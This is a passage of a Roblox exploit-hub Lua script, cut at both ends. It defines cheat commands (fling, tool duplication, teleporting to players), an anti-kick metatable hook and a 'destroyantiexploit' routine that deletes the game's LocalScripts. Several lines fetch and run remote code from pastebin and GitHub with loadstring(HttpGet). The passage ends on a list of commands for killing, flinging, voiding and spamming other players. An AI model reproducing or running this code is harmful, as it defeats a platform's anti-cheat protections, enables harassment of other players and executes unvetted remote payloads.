CFrame.new(-0.776662827, -2.58896613, 5.44642067, 0.015610557, 0.204755932, -0.978683949, 0.999808431, -0.0146257328, 0.0128866518, -0.0116752274, -0.978702009, -0.20494473),
CFrame.new(-0.455375969, -3.01188183, 3.88504672, 0.015610557, 0.204755932, -0.978683949, 0.999808431, -0.0146257328, 0.0128866518, -0.0116752274, -0.978702009, -0.20494473), 
CFrame.new(-0.445787132, -2.41200018, 3.8782444, 0.015610557, 0.204755932, -0.978683949, 0.999808431, -0.0146257328, 0.0128866518, -0.0116752274, -0.978702009, -0.20494473),
CFrame.new(0.0627772883, -5.06107616, -0.385646552, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(0.0819572285, -3.86131263, -0.399250835, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(0.101135343, -2.6615479, -0.412855625, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(0.595253408, -5.09844351, -2.93025184, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(0.614433348, -3.89867902, -2.94385624, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(0.633611381, -2.69891405, -2.9574604, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(-0.411382258, -2.53137517, 2.0424788, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478), 
CFrame.new(-0.39859587, -1.73153222, 2.0334096, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478),
CFrame.new(-1.10770202, -2.482512, 5.37003756, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478), 
CFrame.new(-1.09491575, -1.68266892, 5.36096859, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478),
CFrame.new(-0.472117007, -6.33063555, 2.08556008, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478), 
CFrame.new(-0.459330499, -5.53079224, 2.07649016, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478),
CFrame.new(-1.1556505, -5.48192883, 5.40404987, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478), 
CFrame.new(-1.16843677, -6.28177166, 5.41311932, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478),
CFrame.new(1.41184855, -2.75352597, -6.67650509, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(1.3926686, -3.95329094, -6.66290092, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(1.37348855, -5.15305471, -6.64929676, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(0.879371643, -2.71616006, -4.1318965, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(0.860191762, -3.91592455, -4.11829281, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(0.841011822, -5.11568832, -4.10468864, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(-0.536047339, -10.329855, 2.13090825, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478), 
CFrame.new(-0.523260951, -9.53001118, 2.12183881, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478),
CFrame.new(-1.21958256, -9.48114777, 5.44939709, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478), 
CFrame.new(-1.23236716, -10.2809916, 5.45846796, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478),
CFrame.new(2.23104191, -2.81101251, -10.5912876, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(2.21186209, -4.010777, -10.5776834, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(2.19268394, -5.21054173, -10.5640783, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(1.69856501, -2.77364659, -8.04667759, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(1.67938709, -3.97341132, -8.03307343, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(1.66020691, -5.17317486, -8.01946831, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(-0.599977791, -14.3290749, 2.1762569, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478), 
CFrame.new(-0.587191284, -13.529233, 2.16718698, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478),
CFrame.new(-1.28351295, -13.4803696, 5.49474573, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478), 
CFrame.new(-1.29629946, -14.2802114, 5.50381613, -0.0155062452, 0.204845607, 0.978666842, -0.999815702, -0.0141175529, -0.0128854513, 0.0111767389, -0.978690684, 0.205026478),
CFrame.new(3.05023766, -2.86849904, -14.5060701, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(3.0310576, -4.06826401, -14.492466, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(3.01187778, -5.26802731, -14.4788609, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(2.51776075, -2.83113265, -11.9614611, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
CFrame.new(2.49858093, -4.03089809, -11.9478579, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385), 
CFrame.new(2.47940254, -5.23066235, -11.9342527, 0.205227405, 0.0159715191, 0.978579164, -0.0141227795, 0.999809146, -0.0133561101, -0.978610814, -0.0110792611, 0.205414385),
}
 
for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if i <= #Handles+1 and i>=2 then
v.Grip = Handles[i-1]
v.Parent = game.Players.LocalPlayer.Character
end
end 
end)
addcmd('drophats',{'drophat'},
function(args, speaker)
	if speaker.Character then
		for _,obj in pairs(speaker.Character:GetChildren()) do
			if obj:IsA("Accessory") then
				obj.Parent = workspace
			end
		end
	end
end)

addcmd('droptools',{'droptool'},
function(args, speaker)
	if speaker.Character then
		for _,obj in pairs(speaker.Character:GetChildren()) do
			if obj:IsA("Tool") then
				obj.Parent = workspace
			end
		end
	end
	if speaker:FindFirstChild("Backpack") then
		for _,obj in pairs(speaker.Backpack:GetChildren()) do
			if obj:IsA("Tool") then
				obj.Parent = workspace
			end
		end
	end
end)

addcmd('logs',{'chatlogs'},
function(args, speaker)
	logsDrag:TweenPosition(UDim2.new(0, 0, 1, -250), "InOut", "Quart", 0.3, true, nil)
end)

addcmd('fling',{},
function(args, speaker)
	for _, child in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" or child.ClassName == "MeshPart" then
			child.CustomPhysicalProperties = PhysicalProperties.new(2, 0.3, 0.5)
		end
	end
	for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
		if v:IsA('Accessory') or v:IsA('Hat') then
			for e,c in pairs(v:GetDescendants()) do
				if c:IsA('Part') or c:IsA('MeshPart') then
					c.CustomPhysicalProperties = PhysicalProperties.new(0, 0.3, 0.5)
				end
			end
		end
	end
	execCmd('noclip')
	wait(.1)
	local bambam = Instance.new("BodyAngularVelocity")
	bambam.Parent = Players.LocalPlayer.Character.HumanoidRootPart
	bambam.AngularVelocity = Vector3.new(0,311111,0)
	bambam.MaxTorque = Vector3.new(0,311111,0)
	bambam.P = math.huge
end)

addcmd('unfling',{'nofling'},
function(args, speaker)
	execCmd('clip')
	wait(.1)
	for i,v in pairs(Players.LocalPlayer.Character.HumanoidRootPart:GetChildren()) do
		if v.ClassName == 'BodyAngularVelocity' then
			v:Destroy()
		end
	end
	for _, child in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" or child.ClassName == "MeshPart" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		end
	end
end)

addcmd('spin',{},
function(args, speaker)
	spinInstance = Instance.new("Animation")
	spinInstance.AnimationId = "rbxassetid://188632011"
	spinAnim = Players.LocalPlayer.Character.Humanoid:LoadAnimation(spinInstance)
	spinAnim.Looped = true
	spinAnim:Play()
	if args[1] then
		spinAnim:AdjustSpeed(args[1])
	end
end)

addcmd('unspin',{},
function(args, speaker)
	spinInstance:Destroy()
	spinAnim:Stop()
end)
addcmd('tprandom',{'tpr'},
function(args, speaker)
	local plrs = game.Players
local plr = plrs.LocalPlayer
local backpack = plr.Backpack


function transform()
    for i = 1,2 do
        backpack:FindFirstChildOfClass("Tool").Parent = plr.Character
    end
    for _,v in next, plr.Character:GetChildren() do
        if v:IsA("Tool") then
            v.Parent = workspace
        end
    end
end

for _,v in next, plrs:GetPlayers() do
    if v.Character:FindFirstChildOfClass("Humanoid").Sit == false then
        transform()
        wait(.25)
        plr.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
        wait(.25)
    end
end
end)

addcmd('dae2',{},
function(args, speaker)
local obj = game:service'Players'.LocalPlayer;
local mt = getrawmetatable(obj);
local backup = {} setreadonly(mt,false);for i,v in pairs(mt) do backup[i]=v end mt.__namecall = newcclosure(function(...) local p = {...} x,d = p[1],p[#p] if x == obj and d:lower() == 'kick' then return true; end return backup.__namecall(...); end)
end)

addcmd('destroyantiexploit',{'dae'},
function(args, speaker)
for i, v in pairs(game:GetDescendants()) do
if v:IsA("LocalScript") then
v:Destroy()
end
end
end)  

addcmd('CFrame',{'CFR'},
function(args, speaker)

local coordgui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local title = Instance.new("TextLabel")
local credit = Instance.new("TextLabel")
local grab = Instance.new("TextButton")
local copy = Instance.new("TextButton")
local cords = Instance.new("TextLabel")
--Properties:
coordgui.Name = "coordgui"
coordgui.Parent = game.CoreGui

main.Name = "main"
main.Parent = coordgui
main.BackgroundColor3 = Color3.new(1, 1, 1)
main.Position = UDim2.new(0.352638364, 0, 0.405797124, 0)
main.Size = UDim2.new(0, 228, 0, 142)
main.Style = Enum.FrameStyle.DropShadow
main.Active = true
main.Draggable = true

title.Name = "title"
title.Parent = main
title.BackgroundColor3 = Color3.new(0, 0, 0)
title.Position = UDim2.new(-0.0517418832, 0, -0.054933358, 0)
title.Size = UDim2.new(0, 235, 0, 19)
title.Font = Enum.Font.SciFi
title.Text = "Coordinates Grabber Gui"
title.TextColor3 = Color3.new(1, 1, 1)
title.TextSize = 14

credit.Name = "credit"
credit.Parent = main
credit.BackgroundColor3 = Color3.new(0, 0, 0)
credit.Position = UDim2.new(-0.0517418832, 0, 0.930982113, 0)
credit.Size = UDim2.new(0, 235, 0, 19)
credit.Font = Enum.Font.SciFi
credit.Text = "Made By Katie#8933"
credit.TextColor3 = Color3.new(1, 1, 1)
credit.TextSize = 14

grab.Name = "grab"
grab.Parent = main
grab.BackgroundColor3 = Color3.new(0, 0, 0)
grab.Position = UDim2.new(0.0381504558, 0, 0.600263834, 0)
grab.Size = UDim2.new(0, 128, 0, 31)
grab.Font = Enum.Font.SciFi
grab.Text = "Grab Coordinates"
grab.TextColor3 = Color3.new(1, 1, 1)
grab.TextSize = 14

copy.Name = "copy"
copy.Parent = main
copy.BackgroundColor3 = Color3.new(0, 0, 0)
copy.Position = UDim2.new(0.697107434, 0, 0.595215261, 0)
copy.Size = UDim2.new(0, 52, 0, 32)
copy.Font = Enum.Font.SciFi
copy.Text = "Copy"
copy.TextColor3 = Color3.new(1, 1, 1)
copy.TextSize = 14

cords.Name = "cords"
cords.Parent = main
cords.BackgroundColor3 = Color3.new(0, 0, 0)
cords.Position = UDim2.new(0.0420129336, 0, 0.199266031, 0)
cords.Size = UDim2.new(0, 194, 0, 37)
cords.Font = Enum.Font.SciFi
cords.Text = ""
cords.TextColor3 = Color3.new(1, 1, 1)
cords.TextSize = 14
-- Scripts:
game:GetService("UserInputService").InputBegan:connect(onKeyPress)

grab.MouseButton1Down:Connect(function()
    cords.Text = tostring(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
    wait(0.25)
    print(''..tostring(game.Players.LocalPlayer.Character.HumanoidRootPart.Position))
end)

copy.MouseButton1Down:Connect(function()
    setclipboard(""..cords.Text)
end)
end)
addcmd('bigball',{'bb'},
function(args, speaker)
local toolamount = 150 -- How much covered the ball is
local ballsize = 10 -- How big the ball is

local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Backpack
        tool.Handle.Massless = true
        tool.Grip = CFrame.new(Vector3.new(0, ballsize, 0)) * CFrame.Angles(math.deg(index), index, 0)
        tool.Parent = LocalPlayer.Character
        if tool.Handle:FindFirstChild("Mesh") ~= nil then
            tool.Handle.Mesh:Destroy()
        end
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
LocalPlayer.Character:FindFirstChild("Humanoid").HipHeight = ballsize
end)

addcmd('dupetools',{'dtools'},
function(args, speaker)
local toolamount = 65 -- Amount of tools you want to get

local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
for _, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Backpack
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
end)
addcmd('200dtools',{'fetools'},
function(args, speaker)
local toolamount = 200 -- Amount of tools you want to get

local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
for _, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Backpack
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
end)


if pcall(function() loadstring(game:HttpGet(('https://pastebin.com/raw/eh77L'),true))() end) then
	if ver ~= Version then
		notify('Doot','doot')
	end
	if Announcement and Announcement ~= '' then
		local AnnGUI = Instance.new("Frame")
		local background = Instance.new("Frame")
		local Dark = Instance.new("Frame")
		local TextBox = Instance.new("TextLabel")
		local shadow = Instance.new("Frame")
		local PopupText = Instance.new("TextLabel")
		local Exit = Instance.new("ImageButton")
		
		AnnGUI.Name = randomString()
		AnnGUI.Parent = PARENT
		AnnGUI.Active = true
		AnnGUI.BackgroundColor3 = Color3.new(1, 1, 1)
		AnnGUI.BackgroundTransparency = 1
		AnnGUI.Position = UDim2.new(0.5, -180, 0, -400)
		AnnGUI.Size = UDim2.new(0, 360, 0, 20)
		AnnGUI.ZIndex = 4
		
		background.Name = "background"
		background.Parent = AnnGUI
		background.BackgroundColor3 = Color3.new(255, 0,  255)
		background.BorderSizePixel = 0
		background.Position = UDim2.new(0, 0, 0, 20)
		background.Size = UDim2.new(0, 360, 0, 116)
		
		Dark.Name = "Dark"
		Dark.Parent = background
		Dark.Active = true
		Dark.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
		Dark.BackgroundTransparency = 0.5
		Dark.BorderSizePixel = 0
		Dark.Size = UDim2.new(0, 360, 0, 5)
		
		TextBox.Parent = background
		TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
		TextBox.BackgroundTransparency = 1
		TextBox.Position = UDim2.new(0.0166666675, 0, 0.103232808, 0)
		TextBox.Size = UDim2.new(0, 348, 0, 98)
		TextBox.Font = Enum.Font.SourceSans
		TextBox.FontSize = Enum.FontSize.Size18
		TextBox.TextWrapped = true
		TextBox.Text = Announcement
		TextBox.TextColor3 = Color3.new(1, 1, 1)
		TextBox.TextXAlignment = Enum.TextXAlignment.Left
		TextBox.TextYAlignment = Enum.TextYAlignment.Top
		
		shadow.Name = "shadow"
		shadow.Parent = AnnGUI
		shadow.BackgroundColor3 = Color3.new(255, 0,  255)
		shadow.BorderColor3 = Color3.new(0, 0, 0)
		shadow.BorderSizePixel = 0
		shadow.Size = UDim2.new(0, 360, 0, 20)
		shadow.ZIndex = 4
		
		PopupText.Name = "PopupText"
		PopupText.Parent = shadow
		PopupText.BackgroundTransparency = 1
		PopupText.Position = UDim2.new(0, 51, 0, 0)
		PopupText.Size = UDim2.new(0.760355055, -16, 0.949999988, 0)
		PopupText.ZIndex = 4
		PopupText.Font = Enum.Font.SourceSans
		PopupText.FontSize = Enum.FontSize.Size24
		PopupText.Text = "Katies Announcement"
		PopupText.TextColor3 = Color3.new(1, 1, 1)
		PopupText.TextStrokeTransparency = 0
		PopupText.TextWrapped = true
		
		Exit.Name = "Exit"
		Exit.Parent = shadow
		Exit.BackgroundColor3 = Color3.new(1, 1, 1)
		Exit.BackgroundTransparency = 1
		Exit.Size = UDim2.new(0, 20, 0, 20)
		Exit.ZIndex = 4
		Exit.Image = "rbxassetid://2132544126"
		
		wait(1)
		AnnGUI:TweenPosition(UDim2.new(0.5, -180, 0, 150), "InOut", "Quart", 0.5, true, nil)
		
		Exit.MouseButton1Click:Connect(function()
			AnnGUI:TweenPosition(UDim2.new(0.5, -180, 0, -400), "InOut", "Quart", 0.5, true, nil)
			wait(0.6)
			AnnGUI:Destroy()
		end)
	end
end

wait()
Credits:TweenPosition(UDim2.new(0,0,0.9,0), "Out", "Quart", 0.2)
Logo:TweenSizeAndPosition(UDim2.new(0,175,0,175),UDim2.new(0,37,0,45), "Out", "Quart", 0.3)
wait(1)
for i=1,10 do
	Logo.ImageTransparency = Logo.ImageTransparency+0.1
	IntroBackground.BackgroundTransparency = Logo.BackgroundTransparency+0.1
	wait()
end
Credits:TweenPosition(UDim2.new(0,0,0.9,30), "Out", "Quart", 0.2)
wait(0.2)
Logo:Destroy()
Credits:Destroy()
IntroBackground:Destroy()
minimizeHolder()
function SCRIPT_LLWT78_FAKESCRIPT() -- Holder.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = Holder
	while true do 
	i = 0
	for n=1,0,-0.05 do 
	i = i + 0.05
	script.Parent.BackgroundColor3 = Color3.new(i, 0, n)
	wait() 
	end  
	i = 0
	for n=1,0,-0.05 do 
	i = i + 0.05
	script.Parent.BackgroundColor3 = Color3.new(n, i, 0)
	wait()
	end   
	i = 0
	for n=1,0,-0.05 do 
	i = i + 0.05
	script.Parent.BackgroundColor3 = Color3.new(0, n, i)
	wait() 
	end 
	end 

end
coroutine.resume(coroutine.create(SCRIPT_LLWT78_FAKESCRIPT))

end)

b:Button("CMD-X",function()
   --[[
         ▄▀▄▄▄▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▄▄   ▄▀▀▄  ▄▀▄ 
        █ █    ▌ █  █ ▀  █ █ ▄▀   █ █    █   █ 
        ▐ █      ▐  █    █ ▐ █    █ ▐     ▀▄▀
          █        █    █    █    █      ▄▀ █
         ▄▀▄▄▄▄▀ ▄▀   ▄▀    ▄▀▄▄▄▄▀     █  ▄▀
        █     ▐  █    █    █     ▐    ▄▀  ▄▀
        ▐        ▐    ▐    ▐         █    ▐

    -----------------------------------------------------------------------------------
    |          Credits:                                        |
    -----------------------------------------------------------------------------------
    Creator - pigeon#1818
    Co-Creator - hz#4777
    Devs - Sinerex#7322, 6033#6033
    Former Devs - nathan#0005
    --Credit to IY for some functions within CMD-X--
    -----------------------------------------------------------------------------------
    |          Extras:                                         |
    -----------------------------------------------------------------------------------
    Contributor - Curvn#2646, Bannable#5005
    @ animpack
    -----------------------------------------------------------------------------------
    |           Info:                                          |
    -----------------------------------------------------------------------------------
    Key U - Open/Closes output
    Key Q - Open/Closes CMD-X
    Key ; - Auto Focuses CMDBar
    CMDList - https://pastebin.com/sdVNW5LN 
]]--

    loadstring(game:HttpGet("https://pastebin.com/raw/HFkyyd1H",true))()
end)

b:Button("Infinite Yield",function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end)

b:Button("REVIZ",function()
   -- Creator: illremember#3799

-- Credits to infinite yield, harkinian, dex creators

prefix = ";"
wait(0.3)
Commands = {
	'[-] cmdbar is shown when ; is pressed.',
	'[1] kill [plr] -- You need a tool! Will kill the player, use rkill to kill you and player',
	'[2] bring [plr] -- You need a tool! Will bring player to you',
	'[3] spin [plr] -- You need a tool! Makes you and the player spin crazy',
	'[4] unspin -- Use after using spin cmd and dying, so you stop loop teleporting',
	'[5] attach [plr] -- You need a tool! Attaches you to player',
	'[6] unattach [plr] -- Attempts to unattach you from a player',
	'[7] follow [plr] -- Makes you follow behind the player',
	'[8] unfollow',
	'[9] freefall [plr] -- You need a tool! Teleports you and the player up into the air',
	'[10] trail [plr] -- The opposite of follow, you stay infront of player',
	'[11] untrail',
	'[12] orbit [plr] -- Makes you orbit the player',
	'[13] unorbit',
	'[14] fling [plr] -- Makes you fling the player',
	'[15] unfling',
	'[16] fecheck -- Checks if the game is FE or not',
	'[17] void [plr] -- Teleports player to the void',
	'[18] noclip -- Gives you noclip to walk through walls',
	'[19] clip -- Removes noclip',
	'[20] speed [num]/ws [num] -- Changes how fast you walk 16 is default',
	'[21] jumppower [num]/jp [num] -- Changes how high you jump 50 is default',
	'[22] hipheight [num]/hh [num] -- Changes how high you float 0 is default',
	'[23] default -- Changes your speed, jumppower and hipheight to default values',
	'[24] annoy [plr] -- Loop teleports you to the player',
	'[25] unannoy',
	'[26] headwalk [plr] -- Loop teleports you to the player head',
	'[27] unheadwalk',
	'[28] nolimbs -- Removes your arms and legs',
	'[29] god -- Gives you FE Godmode',
	'[30] drophats -- Drops your accessories',
	'[31] droptool -- Drops any tool you have equipped',
	'[32] loopdhats -- Loop drops your accessories',
	'[33] unloopdhats',
	'[34] loopdtool -- Loop drops any tools you have equipped',
	'[35] unloopdtool',
	'[36] invisible -- Gives you invisibility CREDIT TO TIMELESS',
	'[37] view [plr] -- Changes your camera to the player character',
	'[38] unview',
	'[39] goto [plr] -- Teleports you to player',
	'[40] fly -- Allows you to fly, credit to Infinite Yield',
	'[41] unfly',
	'[42] chat [msg] -- Makes you chat a message',
	'[43] spam [msg] -- Spams a message',
	'[44] unspam',
	'[45] spamwait [num] -- Changes delay of chatting a message for the spam command in seconds default is 1 second',
	'[46] pmspam [plr] -- Spams a player in private message',
	'[47] unpmspam',
	'[48] cfreeze [plr] -- Freezes a player on your client, they will only be frozen for you',
	'[49] uncfreeze [plr]',
	'[50] unlockws -- Unlocks the workspace',
	'[51] lockws -- Locks the workspace',
	'[52] btools -- Gives you btools that will only show to you useful for deleting certain blocks only for you',
	'[53] pstand -- Enables platform stand',
	'[54] unpstand -- Disables platform stand',
	'[55] blockhead -- Removes your head mesh',
	'[56] sit',
	'[57] bringobj [obj] -- Only shows on client, brings an object/part to you constantly, can be used to bring healing parts, weapons, money etc, type in exact name',
	'[58] wsvis [num] -- Changes visibility of workspace parts, num should be between 0 and 1, only shows client sided',
	'[59] hypertotal -- Loads in my FE GUI Hypertotal',
	'[60] cmds -- Prints all commands',
	'[61] rmeshhats/blockhats -- Removes the meshes of all your accessories aka block hats',
	'[62] rmeshtool/blocktool -- Removes the mesh of the tool you have equipped aka block tool',
	'[63] spinner -- Makes you spin',
	'[64] nospinner',
	'[65] reach [num] -- Gives you reach, mostly used for swords, say ;reachd for default and enter number after for custom',
	'[66] noreach -- Removes reach, must have tool equipped',
	'[67] rkill [plr] -- Kills you and the player, use kill to just kill the player without dying',
	'[68] tp me [plr] -- Alternative to goto',
	'[69] cbring [plr] -- Brings player infront of you, shows only on client, allows you to do damage to player',
	'[70] uncbring',
	'[71] swap [plr] -- You need a tool! Swaps players position with yours and your position with players',
	'[72] givetool [plr] -- Gives the tool you have equipped to the player',
	'[73] glitch [plr] -- Glitches you and the player, looks very cool',
	'[74] unglitch -- Unglitches you',
	'[75] grespawn -- Alternative to normal respawn and usually works best for when you want to reset with FE Godmode',
	'[76] explorer -- Loads up DEX',
	'[77] reset -- Resets your character.',
	'[78] anim [id] -- Applies an animation on you, must be created by ROBLOX',
